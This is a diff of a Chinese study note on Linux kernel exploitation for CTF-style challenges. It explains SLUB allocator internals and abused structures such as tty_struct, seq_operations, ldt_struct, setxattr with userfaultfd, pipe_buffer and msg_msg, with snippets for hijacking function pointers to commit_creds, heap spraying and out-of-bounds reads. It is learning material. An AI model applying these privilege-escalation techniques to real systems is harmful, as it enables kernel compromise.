@@ -41,9 +41,26 @@ author: Exploooosion
 
 * 所有 `kmem_cache` 构成双向链表，且有一个全局数组 `kmalloc_caches` 存放通用 `kmem_cache`，大小为 `2`的幂次方，在分配时，其会选择一个大于其大小的 `2`的幂次方的值。（此外，为了减少内存碎片，还有一些特殊大小的 `slub`，例如 `96`字节和 `192`字节。）
 * 其中关键成员包括：
-
   * `cpu_slab`：`struct kmem_cache_cpu __percpu *` 类型，指向当前 `CPU` 独占的内存池（同一个 `CPU` 访问自己的内存池不用上锁，优先从中分配、释放，效率高，通过 `gs`寄存器作为 `percpu`基址进行寻址，做题时先绑定 `CPU`）
   * `node`：`struct kmem_cache_node *[]` 类型，存放多个不同 `node` 的后备内存池
+
+```c
+/*  84 */ struct kmem_cache {
+/*  85 */ 	struct kmem_cache_cpu __percpu *cpu_slab;
+/*  86 */ 	/* Used for retrieving partial slabs, etc. */
+/*  87 */ 	slab_flags_t flags;
+/*  88 */ 	unsigned long min_partial;
+/*  89 */ 	unsigned int size;	/* The size of an object including metadata */
+/*  90 */ 	unsigned int object_size;/* The size of an object without metadata */
+/*  91 */ 	struct reciprocal_value reciprocal_size;
+/*  92 */ 	unsigned int offset;	/* Free pointer offset */
+/*  93 */ #ifdef CONFIG_SLUB_CPU_PARTIAL
+/*  94 */ 	/* Number of per cpu partial objects to keep around */
+/*  95 */ 	unsigned int cpu_partial;
+/*  96 */ #endif
+------
+/* 136 */ };
+```
 
 ![1740888683949](../images/learning_linux_kernel_2/1740888683949.png)*
 
@@ -54,6 +71,19 @@ author: Exploooosion
   * `freelist`：指向下一个可用对象（`object`）的指针，其 `freelist`与slab中的 `freelist`不同（仅当 `slab` 对象被挂在 `partial` 链表中时，其 `freelist` 才有可能被用到；分配和释放优先考虑 `kmem_cache_cpu`中的 `freelist`）
   * `slab`：指向当前用以进行内存分配的 `slab`
   * `partial`：需要开启编译选项 `CONFIG_SLUB_CPU_PARTIAL=y`，`percpu` 的 `partial slab` 链表，链表上为仍有一定空闲对象的 `slab`
+
+```c
+// >>> include/linux/slub_def.h:43
+/* 43 */ struct kmem_cache_cpu {
+/* 44 */ 	void **freelist;	/* Pointer to next available object */
+/* 45 */ 	unsigned long tid;	/* Globally unique transaction id */
+/* 46 */ 	struct page *page;	/* The slab from which we are allocating */
+/* 47 */ #ifdef CONFIG_SLUB_CPU_PARTIAL
+/* 48 */ 	struct page *partial;	/* Partially allocated frozen slabs */
+/* 49 */ #endif
+-------
+/* 53 */ };
+```
 
 ##### kmem_cache_node 结构体
 
@@ -79,9 +109,11 @@ author: Exploooosion
 
 若其 `slub`属于 `kmem_cache_node`的 `full`链表上的 `slub`，则会使其成为对应 `slub`的 `freelist`的头结点，并将该 `slub`从 `full`链表迁移到 `partial`
 
-。
+## 常用结构体、函数及利用方法
 
-### 常用结构体、函数及利用方法
+### tty 设备结构体
+
+tty 设备在 `/dev` 下的一个伪终端设备 `ptmx` 。
 
 #### tty_struct（kmalloc-1k | GFP_KERNEL_ACCOUNT）
 
@@ -183,24 +215,20 @@ cat /proc/kallsyms | grep 'ptm_unix98_ops'
 
 ```c
 struct tty_operations {
-    struct tty_struct * (*lookup)(struct tty_driver *driver,
-            struct file *filp, int idx);
+    struct tty_struct * (*lookup)(struct tty_driver *driver,struct file *filp, int idx);
     int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
     void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
     int  (*open)(struct tty_struct * tty, struct file * filp);
     void (*close)(struct tty_struct * tty, struct file * filp);
     void (*shutdown)(struct tty_struct *tty);
     void (*cleanup)(struct tty_struct *tty);
-    int  (*write)(struct tty_struct * tty,
-              const unsigned char *buf, int count);
+    int  (*write)(struct tty_struct * tty,const unsigned char *buf, int count);
     int  (*put_char)(struct tty_struct *tty, unsigned char ch);
     void (*flush_chars)(struct tty_struct *tty);
     unsigned int (*write_room)(struct tty_struct *tty);
     unsigned int (*chars_in_buffer)(struct tty_struct *tty);
-    int  (*ioctl)(struct tty_struct *tty,
-            unsigned int cmd, unsigned long arg);
-    long (*compat_ioctl)(struct tty_struct *tty,
-                 unsigned int cmd, unsigned long arg);
+    int  (*ioctl)(struct tty_struct *tty,unsigned int cmd, unsigned long arg);
+    long (*compat_ioctl)(struct tty_struct *tty,unsigned int cmd, unsigned long arg);
     void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
     void (*throttle)(struct tty_struct * tty);
     void (*unthrottle)(struct tty_struct * tty);
@@ -258,17 +286,36 @@ static void work_for_cpu_fn(size_t * args)
 
 ##### 利用：
 
-可以将 `tty_struct`劫持为如下形式：（劫持函数表 `tty_operations`中的 `ioctl`）
+可以将 `tty_struct`劫持为如下形式：（劫持函数表 `tty_operations`中的 `ioctl` 为work_for_cpu_fn）
 
 ```c
 tty_struct[4] = (size_t)commit_creds;
 tty_struct[5] = (size_t)init_cred;
 
+ioctl(tty_fd, 233, 233);
 /*相当于执行
 ((void*)tty_struct[4])(tty_struct[5]);
 commit_creds(&init_cred);
 */
 ```
+
+#### tty_file_private (kmalloc-32 | GFP_KERNEL)
+
+##### 定义：
+
+```从
+struct tty_file_private {
+    struct tty_struct *tty;
+    struct file *file;
+    struct list_head list;
+};
+```
+
+打开 `/dev/ptmx` 时会分配 `tty_file_private` 并且该结构体的 `tty` 指针会指向 `tty_struct` 。（UAF用于泄露地址）
+
+相应的，当关闭打开的 `/dev/ptmx` 时会释放相应结构。
+
+### seq_file 相关
 
 #### seq_operation(kmalloc-32 | GFP_KERNEL_ACCOUNT)
 
@@ -320,11 +367,151 @@ cat /proc/kallsyms | grep 'single_start'
 
 ##### 劫持内核执行流
 
+当 `read` 一个 `stat` 文件时，内核会调用其 `proc_ops` 的 `proc_read_iter` 指针，其默认值为 `seq_read_iter()` 函数
+
 只需要控制 `seq_operations->start` 后再用 `read`读取对应 `stat` 文件便能控制内核执行流（但是参数不可控，可以配合 `pt_reg`结构体使用）。
 
 调试时可在 `seq_read_iter`函数处下断点。
 
 可以选择覆盖 `start`函数指针为一个 `add_rsp_xxx_ret`类似的 `gadget`，将栈抬到 `pt_reg`结构体处，从而执行ROP。
+
+### ldt_struct结构体
+
+### ldt_struct: kmalloc-16(slub)/kmalloc-32(slab)
+
+在内核中与 LDT 相关联的结构体为 `ldt_struct`
+
+```c
+struct ldt_struct {
+	struct desc_struct *       entries;              /*     0   0x8 */
+	unsigned int               nr_entries;           /*   0x8   0x4 */
+	int                        slot;                 /*   0xc   0x4 */
+
+	/* size: 16, cachelines: 1, members: 3 */
+	/* last cacheline: 16 bytes */
+};
+```
+
+`modify_ldt` 系统调用可以用来操纵对应进程的 `ldt_struct`
+
+```c
+SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
+        unsigned long , bytecount)
+{
+    int ret = -ENOSYS;
+
+    switch (func) {
+    case 0:
+        ret = read_ldt(ptr, bytecount);
+        break;
+    case 1:
+        ret = write_ldt(ptr, bytecount, 1);
+        break;
+    case 2:
+        ret = read_default_ldt(ptr, bytecount);
+        break;
+    case 0x11:
+        ret = write_ldt(ptr, bytecount, 0);
+        break;
+    }
+    /*
+     * The SYSCALL_DEFINE() macros give us an 'unsigned long'
+     * return type, but tht ABI for sys_modify_ldt() expects
+     * 'int'.  This cast gives us an int-sized value in %rax
+     * for the return code.  The 'unsigned' is necessary so
+     * the compiler does not try to sign-extend the negative
+     * return codes into the high half of the register when
+     * taking the value from int->long.
+     */
+    return (unsigned int)ret;
+}
+```
+
+#### 泄露地址：modify_ldt 系统调用 - read_ldt()
+
+```c
+static int read_ldt(void __user *ptr, unsigned long bytecount)
+{
+//...
+    if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
+        retval = -EFAULT;
+        goto out_unlock;
+    }
+//...
+out_unlock:
+    up_read(&mm->context.ldt_usr_sem);
+    return retval;
+}
+```
+
+`read_ldt()` **直接调用 copy_to_user 向用户地址空间拷贝数据** ，若是能够控制 `ldt->entries` 便能够完成内核的任意地址读，由此泄露出内核数据。
+
+`copy_to_user()` 的一个特性：对于非法地址，其并不会造成 kernel panic，只会返回一个非零的错误码。我们可以多次修改 ldt->entries 并多次调用 `modify_ldt()` 以 爆破内核 .text 段地址与 page_offset_base ，若是成功命中，则 `modify_ldt` 会返回给我们一个非负值。
+
+但是由于 `Hardened usercopy` 的存在，对于直接拷贝代码段上数据的行为会导致 kernel panic，但是在**page_offset_base + 0x9d000 的地方（非代码段）存储着 secondary_startup_64 函数的地址，于是思路就是爆破page_offset_base的地址**
+
+#### 绕过hardened usercopy
+
+通过 `fork`创建子进程，然后使用子进程来 `read_ldt` ，在 `fork`时，会将父进程的 `ldt`拷贝给子进程
+
+![1760624453851](../images/learning_linux_kernel_2/1760624453851.png)
+
+### setxattr系统调用 GFP_KERNEL
+
+#### setxattr
+
+可以通过以下方式使用：
+
+```c
+#include <sys/xattr.h>
+
+setxattr("/exploit", "username", value, size, 0); //第一个参数指定一个存在的文件，第二个参数随便
+```
+
+该系统调用会走到下面这个函数：可以看到能够进行任意大小的 object 分配，size可控且内容可控，但是之后会被释放掉
+
+```c
+static long
+setxattr(struct dentry *d, const char __user *name, const void __user *value,
+     size_t size, int flags)
+{
+    //...
+        kvalue = kvmalloc(size, GFP_KERNEL);
+        if (!kvalue)
+            return -ENOMEM;
+        if (copy_from_user(kvalue, value, size)) {
+
+    //,..
+
+    kvfree(kvalue);
+
+    return error;
+}
+```
+
+##### 利用- 结合userfaultfd来堆占位
+
+我们申请一块连续的两页内存:
+
+```c
+| memory1: size=pagesize | memory2: size=pagesize |
+```
+
+随后,我们 **为第二部分的内存,注册 `userfaultfd`** , 使得访问到这里时直接卡住.
+
+![1760709522108](../images/learning_linux_kernel_2/1760678357093.png)
+
+代码如下：
+
+```c
+pwn_addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+register_userfaultfd_for_thread_stucking(&monitor_setx, (void*)((size_t)pwn_addr + 0x1000), 0x1000);
+
+*(size_t*)((size_t)pwn_addr + 0x1000 - 8) = add_rsp_0x1f8 + kernel_offset;
+setxattr("/init", "ltfall", (char*)((size_t)pwn_addr + 0x1000 - 8), 0x20, 0);
+```
+
+可以看到,我们上面便申请了一个 `kmalloc-32`的 `obj`,并写入了 `add_rsp_0x1f8`的 `gadget`
 
 #### user_key_payload (kmalloc-any, GFP_KERNEL)
 
@@ -399,7 +586,9 @@ cat /proc/kallsyms | grep 'user_free_payload_rcu'
 
 读取 `rcu->func`泄露堆地址
 
-#### pipe相关
+### pipe 管道相关
+
+#### pipe_inode_info
 
 ##### 定义：
 
@@ -433,6 +622,8 @@ cat /proc/kallsyms | grep 'user_free_payload_rcu'
 };
 ```
 
+`pipe_inode_info->bufs` 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址
+
 和 `pipe_buffer` （`kmalloc-1k | GFP_KERNEL_ACCOUNT`），往 `pipe_fd[1]`中写入数据成功后才会初始化 `pipe_buffer`
 
 ```c
@@ -443,6 +634,40 @@ struct pipe_buffer {
 	unsigned int flags;
 	unsigned long private;
 };
+void pipe_buffer_init(){
+    puts("[*] pipe buffer init");
+    for (int i = 0; i < MAX_PIPE_COUNT; ++i) {
+        uint32_t k = i;
+        write(pipe_fd[i][1], "QQEEDD", 8);
+        write(pipe_fd[i][1], &k, sizeof(uint32_t));
+    }
+}
+/*
+pipe_fd[i][0]：这是管道的 读取端 (Read End)。通过这个文件描述符从管道缓冲区中读取数据。
+pipe_fd[i][1]：这是管道的 写入端 (Write End)。通过这个文件描述符向管道缓冲区中写入数据。
+*/
+```
+
+![1760602477857](../images/learning_linux_kernel_2/1760602477857.png)
+
+具体到每个 `pipe_buffer` 其中的 `offset` 和 `len` 标记了 `pipe_buffer` 对应内存页中的数据。
+
+![1760602494097](../images/learning_linux_kernel_2/1760602494097.png)
+
+可以通过系统调用更改pipe_buffer的大小
+
+当选项为 `F_SETPIPE_SZ` 其会修改当前pipe的bufs数组大小为第三个参数 `(arg>>12)*sizeof(*bufs)` 注意arg>>12（2^12=0x1000）必须是2的幂次方 `sizeof(*bufs)=64`
+
+```c
+void pipe_buffer_resize(){
+    puts("[*] pipe buffer resize");
+    for(int i = 0; i < MAX_PIPE_COUNT; i++){
+        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 4) < 0) {
+            perror("resize pipe");  
+            exit(0);
+        }  
+    }
+}
 ```
 
 其中 `pipe_buf_operations`结构体：
@@ -493,7 +718,7 @@ struct pipe_buf_operations {
 
 一个栈迁移的JOP gadget（不知道怎么搜这种类型的gadget)，实现效果是
 
-RDX！=RCX时PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET
+RDX！=RCX时PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET可以用于此处栈迁移
 
 ```bash
 # exploooosion @ Exploooosion in ~/mypwn/linux_kernel/Digging-into-Kernel-3/core workenv [15:24:16] 
@@ -534,8 +759,82 @@ ffffffff82003242:	0f ae e8             	lfence
 ffffffff82003245:	eb f9                	jmp    ffffffff82003240 <__x86_return_thunk>
 ffffffff82003247:	cc                   	int3
 (workenv) 
-
 ```
+
+ps：可以通过pwntools寻找
+
+```python
+from pwn import *
+context(arch = 'amd64', os = 'linux')
+elf = ELF('vmlinux')
+for x in elf.search(asm('push rsi; pop rsp;'), executable = True):
+    print elf.disasm(address = x, n_bytes = 0x40)
+    print
+```
+
+### System V 消息队列
+
+在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：
+
+* msgget：创建一个消息队列
+* msgsnd：向指定消息队列发送消息
+* msgrcv：从指定消息队列接接收消息
+
+当我们创建一个消息队列时，在内核空间中会创建一个 `msg_queue` 结构体，其表示一个消息队列：
+
+```c
+/* one msq_queue structure for each present queue on the system */
+struct msg_queue {
+    struct kern_ipc_perm q_perm;
+    time64_t q_stime;		/* last msgsnd time */
+    time64_t q_rtime;		/* last msgrcv time */
+    time64_t q_ctime;		/* last change time */
+    unsigned long q_cbytes;		/* current number of bytes on queue */
+    unsigned long q_qnum;		/* number of messages in queue */
+    unsigned long q_qbytes;		/* max number of bytes on queue */
+    struct pid *q_lspid;		/* pid of last msgsnd */
+    struct pid *q_lrpid;		/* last receive pid */
+
+    struct list_head q_messages;
+    struct list_head q_receivers;
+    struct list_head q_senders;
+} __randomize_layout;
+```
+
+#### msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)
+
+```c
+struct msg_msg {
+	struct list_head  m_list;   // 只有一条消息时，指向msg_queue的q_messages            /*     0  0x10 */  
+	long int      m_type;   /* message text size */         /*  0x10   0x8 */
+	size_t         m_ts;                 /*  0x18   0x8 */
+	struct msg_msgseg *        next;                 /*  0x20   0x8 */
+	void *                     security;             /*  0x28   0x8 */
+
+	/* size: 48, cachelines: 1, members: 5 */
+	/* last cacheline: 48 bytes */
+};
+struct list_head{
+    struct msg_msg* next;
+    struct msg_msg* prev;
+}
+```
+
+`msg_queue` 和 `msg_msg` 构成双向链表
+
+![1760710744145](../images/learning_linux_kernel_2/1760710744145.png)
+
+`msg_queue` 的大小基本上是固定的，但是 `msg_msg` 作为承载消息的本体**其大小是可以随着消息大小的改变而进行变动的**
+
+当我们单次发送 **大于【一个页面大小 - header size】** 大小的消息时，内核会额外补充添加 `msg_msgseg` 结构体，其与 `msg_msg` 之间形成如下单向链表结构：单个 `msg_msgseg` 的大小最大为一个页面大小
+
+![1760710836562](../images/learning_linux_kernel_2/1760710836562.png)
+
+#### 利用
+
+#### 越界数据读取
+
+在拷贝数据时对长度的判断主要依靠的是 `msg_msg->m_ts`，我们不难想到的是：若是我们能够控制一个 `msg_msg` 的 header，将其 `m_ts` 成员改为一个较大的数，我们就能够**越界读取出最多将近一张内存页大小的数据**
 
 ### 条件竞争（Race condition）
 
